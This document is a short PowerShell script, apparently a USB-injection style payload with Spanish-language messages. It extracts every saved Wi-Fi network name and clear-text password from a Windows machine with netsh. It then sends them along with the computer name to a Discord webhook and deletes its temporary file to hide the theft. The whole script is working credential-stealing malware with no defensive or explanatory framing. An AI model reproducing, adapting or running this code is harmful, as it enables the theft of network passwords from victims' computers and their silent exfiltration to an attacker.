$whuri = "$dc"
if ($whuri.Length -lt 120) {
    $whuri = "https://discord.com/api/webhooks/$dc"
}

$outfile = ""
$a = 0
$ws = (netsh wlan show profiles) -replace ".*:\s+"

foreach ($s in $ws) {
    if ($a -gt 1 -and $s -notmatch " policy " -and $s -ne "User profiles" -and $s -notmatch "-----" -and $s -notmatch "<None>" -and $s.length -gt 5) {
        $ssid = $s.Trim()
        if ($s -match ":") {
            $ssid = $s.Split(":")[1].Trim()
        }
        $pw = netsh wlan show profile name="$ssid" key=clear
        $pass = "None"
        foreach ($p in $pw) {
            if ($p -match "Key Content|Contenido de la clave") {
                $pass = ($p -split ":")[1].Trim()
                $outfile += "SSID: $ssid : Password: $pass`n"
            }
        }
    }
    $a++
}

if ([string]::IsNullOrWhiteSpace($outfile)) {
    $outfile = "No se encontraron contraseñas WiFi en este equipo."
}

$outfile | Out-File -FilePath "$env:temp\info.txt" -Encoding ASCII -Append

$Pathsys = "$env:temp\info.txt"
$msgsys = Get-Content -Path $Pathsys -Raw 
$escmsgsys = $msgsys -replace '[&<>]', { $args[0].Value.Replace('&','&amp;').Replace('<','&lt;').Replace('>','&gt;') }
$jsonsys = @{ username = $env:COMPUTERNAME; content = $escmsgsys } | ConvertTo-Json

Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
Remove-Item -Path $Pathsys -Force